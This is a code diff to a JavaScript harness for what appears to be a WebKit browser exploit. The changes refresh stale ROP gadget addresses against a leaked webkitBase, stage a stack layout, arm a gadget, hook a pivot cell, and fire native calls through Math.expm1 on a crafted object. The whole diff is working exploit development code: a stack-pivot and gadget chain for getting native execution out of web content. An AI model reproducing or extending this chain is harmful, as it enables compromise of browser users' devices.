@@ -75,10 +75,11 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
     bisectFireExpm1,     bisectRestore, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
+    prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830am";
+const BUILD_ID = "rw-20250830an";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -775,6 +776,9 @@ function gateNativeFire(p, off) {
 function ensureNativePrepForFire(p, off, nm) {
     trimBeforeNativeFire();
     if (nativePrep && params.get("freshprep") !== "1") {
+        const wb = chainWebkitBase(off) || nativePrep.webkitBase;
+        if (wb && prepGadgetRvaStale(nativePrep, off))
+            refreshPrepSlabGadgets(nativePrep, off, wb);
         mark("NATIVE-PREP", "reuse Start slab wb=" + nativePrep.webkitBase + " mode=" + nm);
         return;
     }
@@ -4253,6 +4257,33 @@ function runArmGetpid() {
     runFireGetpid();
 }
 
+function bisectPrepRefresh(p, off, tag) {
+    if (!nativePrep) return false;
+    const wb = chainWebkitBase(off) || nativePrep.webkitBase;
+    if (!wb) return false;
+    const stale = refreshPrepSlabGadgets(nativePrep, off, wb);
+    if (stale) {
+        bisectLog("PREP-REFRESH", (tag || "bisect")
+            + " slab G0-G5 updated (Start prep had stale RVAs)"
+            + " G0=" + nativePrep.G.G0 + " G5=" + nativePrep.G.G5);
+    }
+    return stale;
+}
+
+function bisectEnsureReadyForN5(p, off) {
+    bisectPrepRefresh(p, off, "pre-N5");
+    if (!nativePrep.staged) {
+        layoutSmokeStack(nativePrep);
+        bisectLog("BISECT-WARN", "N5 auto N2 smoke layout (required before expm1 fire)");
+    }
+    if (!nativePrep.mainArmed)
+        bisectArmG0(p, nativePrep);
+    if (!nativePrep._bisect || !nativePrep._bisect.multiSaved) {
+        bisectHookPivotPoops(p, nativePrep);
+        bisectLog("BISECT-WARN", "N5 poops hook @ pivotCell+0 (chain_poops style)");
+    }
+}
+
 function requireNativePrep() {
     if (!nativePrep) throw new Error("run N1 prep first");
 }
@@ -4340,6 +4371,9 @@ function runNativeBisectStep(stepId) {
         switch (stepId) {
         case "prep":
             if (nativePrep && params.get("freshprep") !== "1") {
+                if (prepGadgetRvaStale(nativePrep, off)) {
+                    bisectLog("BISECT-WARN", "prep @ Start is STALE — add ?freshprep=1 to URL and redo Start+N1");
+                }
                 mark("BISECT-OK", "N1 reuse @ Start wb=" + nativePrep.webkitBase
                     + " S=" + nativePrep.M.S + " (skip N1 — prep pinned @ PRIMITIVE-OK)");
                 state("N1 skipped — use N2", "ok");
@@ -4383,6 +4417,7 @@ function runNativeBisectStep(stepId) {
             break;
         case "arm-g0":
             requireNativePrep();
+            bisectPrepRefresh(p, off, "pre-N3");
             bisectArmG0(p, nativePrep);
             bisectSnapshot(p, nativePrep, off, "post-N3");
             bisectLog("BISECT-OK", "N3 armed G0 → mainMf");
@@ -4438,24 +4473,28 @@ function runNativeBisectStep(stepId) {
             break;
         case "expm1-lite":
             requireNativePrep();
+            bisectPrepRefresh(p, off, "pre-N5a");
             if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
             bisectSnapshot(p, nativePrep, off, "pre-N5a");
-            bisectLog("BISECT-WARN", "N5a expm1(1) — OOM EXPECTED (G0 runs, [rsi+0x30] unpoisoned)");
+            bisectLog("BISECT-WARN", "N5a expm1(1) — OOM EXPECTED (G0 runs, NO hook)");
             Math.expm1(1);
             bisectLog("BISECT-OK", "N5a expm1(1) survived (unexpected — G0 may not have run)");
             state("N5a OK", "ok");
             break;
         case "expm1-nohook":
             requireNativePrep();
+            bisectPrepRefresh(p, off, "pre-N5c");
+            if (!nativePrep.staged) layoutSmokeStack(nativePrep);
             if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
             bisectSnapshot(p, nativePrep, off, "pre-N5c");
-            bisectLog("BISECT-WARN", "N5c Math.expm1(pivotObj) — G0 armed, NO hook");
+            bisectLog("BISECT-WARN", "N5c Math.expm1(pivotObj) — G0 armed, NO hook (OOM expected)");
             Math.expm1(nativePrep.pivotObj);
             bisectLog("BISECT-OK", "N5c expm1(obj) survived");
             state("N5c OK", "ok");
             break;
         case "expm1":
             requireNativePrep();
+            bisectEnsureReadyForN5(p, off);
             bisectSnapshot(p, nativePrep, off, "pre-N5");
             bisectLog("BISECT-WARN", "N5 Math.expm1(pivotObj) — firing…");
             bisectFireExpm1(p, nativePrep);
